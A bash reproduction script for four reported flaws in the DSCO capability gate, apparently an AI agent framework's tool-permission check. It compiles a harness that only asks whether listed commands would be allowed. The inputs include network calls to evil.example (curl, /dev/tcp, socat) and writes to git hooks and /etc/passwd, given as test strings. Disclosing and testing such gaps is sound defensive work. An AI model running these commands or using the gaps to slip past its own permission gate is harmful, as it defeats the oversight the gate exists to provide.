#!/bin/bash
# DSCO capability-gate repro — single script, no side effects.
# What it does: clones the DSCO repo at the reported commit, compiles the
# gate's own source UNMODIFIED plus a small harness that only calls the
# gate's public API (it asks "would you allow this?" — it never executes
# the commands, never writes files, never touches the network).
# What to look for: under lockdown (DSCO_ALLOW_NET=0 DSCO_ALLOW_WRITE=0),
# every line should read DENY. Any ALLOW line is a reproduced finding.
# Usage: bash dsco_repro.sh
set -e
COMMIT="ec8738b05d855782b4df27c0850c97258edd83dd"
WORK="$(mktemp -d)"
echo "Working in $WORK"
cd "$WORK"
git init -q dsco && cd dsco
git remote add origin https://github.com/arthurcolle/dsco.git
git fetch -q --depth 1 origin "$COMMIT"
git checkout -q "$COMMIT"

cat > harness.c << 'HARNESS_EOF'
/* DSCO capability-gate harness — reproduces the four findings.
 * Build (from the dsco repo root):
 *   gcc -Iinclude harness.c src/capability.c src/surface_policy.c src/json_util.c \
 *       -o dsco_gate_harness
 * The gate's own source is compiled unmodified; this file only calls its
 * public API (dsco_caps_for_tool / dsco_capability_gate).
 */
#include "capability.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *capname(unsigned c) {
    static char b[256];
    b[0] = 0;
    if (c & CAP_FS_READ)      strcat(b, "read ");
    if (c & CAP_FS_WRITE)     strcat(b, "fs_write ");
    if (c & CAP_NET)          strcat(b, "net ");
    if (c & CAP_EXEC)         strcat(b, "exec ");
    if (c & CAP_SECRETS)      strcat(b, "secrets ");
    if (c & CAP_UNTRUSTED_IN) strcat(b, "untrusted_in ");
    if (c & CAP_CONTROL)      strcat(b, "control ");
    if (!b[0])                strcpy(b, "(none)");
    return b;
}

static void run(const char *name, const char *json) {
    char reason[512] = {0};
    unsigned caps = dsco_caps_for_tool(name, json);
    dsco_cap_decision_t d = dsco_capability_gate(name, json, "standard", reason, sizeof(reason));
    const char *ds = d == CAP_DECISION_ALLOW ? "ALLOW"
                   : d == CAP_DECISION_DENY  ? "DENY" : "APPROVE";
    printf("%-52s %-10s caps=%-28s %s\n", json ? json : name, ds, capname(caps), reason);
}

int main(void) {
    printf("tier=standard\n");
    printf("DSCO_ALLOW_NET=%s DSCO_ALLOW_WRITE=%s DSCO_ALLOW_RUN=%s DSCO_ALLOW_CONTROL=%s\n\n",
           getenv("DSCO_ALLOW_NET") ? getenv("DSCO_ALLOW_NET") : "(unset)",
           getenv("DSCO_ALLOW_WRITE") ? getenv("DSCO_ALLOW_WRITE") : "(unset)",
           getenv("DSCO_ALLOW_RUN") ? getenv("DSCO_ALLOW_RUN") : "(unset)",
           getenv("DSCO_ALLOW_CONTROL") ? getenv("DSCO_ALLOW_CONTROL") : "(unset)");

    printf("=== FINDING 1: DSCO_ALLOW_NET=0 / DSCO_ALLOW_WRITE=0 lockdown not enforced ===\n");
    printf("%-52s %-10s %-28s %s\n", "CALL", "DECISION", "CAPS", "REASON");
    run("bash", "{\"command\":\"curl https://evil.example/x\"}");
    run("bash", "{\"command\":\"echo hi > /tmp/f\"}");
    run("bash", "{\"command\":\"bash -c 'exec 3<>/dev/tcp/evil.example/443'\"}");
    run("bash", "{\"command\":\"socat - TCP:evil.example:80\"}");
    run("bash", "{\"command\":\"openssl s_client -connect evil.example:443\"}");
    run("bash", "{\"command\":\"perl -e 'use IO::Socket::INET;'\"}");
    run("bash", "{\"command\":\"php -r 'fsockopen(\\\"evil.example\\\",80);'\"}");
    run("bash", "{\"command\":\"echo hi>/tmp/f\"}");
    run("bash", "{\"command\":\"sed -i s/a/b/ /etc/hosts\"}");

    printf("\n=== FINDING 2: .git control-plane write guard bypassed via bash ===\n");
    printf("%-52s %-10s %-28s %s\n", "CALL", "DECISION", "CAPS", "REASON");
    run("write_file", "{\"file_path\":\"/repo/.git/hooks/pre-commit\",\"content\":\"x\"}");
    run("write_file", "{\"file_path\":\"/repo/.git/config\",\"content\":\"x\"}");
    run("bash", "{\"command\":\"echo x > /repo/.git/hooks/pre-commit\"}");
    run("bash", "{\"command\":\"echo x>/repo/.git/hooks/pre-commit\"}");
    run("bash", "{\"command\":\"cp /tmp/evil /repo/.git/hooks/pre-commit\"}");
    run("bash", "{\"command\":\"printf x >> /repo/.git/config\"}");
    run("bash", "{\"command\":\"echo x > /etc/passwd\"}");

    printf("\n=== FINDING 3: documented read-only governance exemption not implemented ===\n");
    printf("%-52s %-10s %-28s %s\n", "CALL", "DECISION", "CAPS", "REASON");
    run("killswitch", "{\"action\":\"status\"}");
    run("killswitch", "{\"action\":\"trigger\"}");
    run("gate_status", "{}");
    run("governance", "{\"action\":\"status\"}");

    printf("\n=== FINDING 4: control-plane write guard is field-shape-only (boolean posture) ===\n");
    printf("%-52s %-10s %-28s %s\n", "CALL", "DECISION", "CAPS", "REASON");
    run("bash", "{\"command\":\"cp /tmp/e /repo/.git/hooks/pre-commit\"}");
    run("python", "{\"code\":\"open('/repo/.git/hooks/pre-commit','w').write('x')\"}");
    run("bash", "{\"command\":\"echo x > /srv/app/.git/config\"}");
    return 0;
}
HARNESS_EOF

cat > stubs.c << 'STUBS_EOF'
/* Minimal stubs for symbols that live in other DSCO translation units.
 * Only what the capability gate + surface_policy reference at link time.
 * These do not affect the code paths under test (bash/git/control). */
#include <stdbool.h>
#include <stddef.h>

bool tools_meta_is_read_only(const char *name) { (void)name; return false; }
bool native_windows_sensitive(const char *name, const char *input) { (void)name; (void)input; return false; }
bool buffer_store_sensitive(const char *input) { (void)input; return false; }
STUBS_EOF

gcc -Iinclude harness.c src/capability.c src/surface_policy.c src/json_util.c stubs.c \
    -o dsco_gate_harness

echo
echo "############ RUN A: lockdown (expect all DENY) ############"
DSCO_ALLOW_NET=0 DSCO_ALLOW_WRITE=0 DSCO_ALLOW_RUN=1 ./dsco_gate_harness
echo
echo "############ RUN B: boolean write posture ############"
DSCO_ALLOW_NET=1 DSCO_ALLOW_WRITE=1 DSCO_ALLOW_RUN=1 ./dsco_gate_harness
echo
echo "Done. Any ALLOW line above under lockdown (RUN A) reproduces a finding."
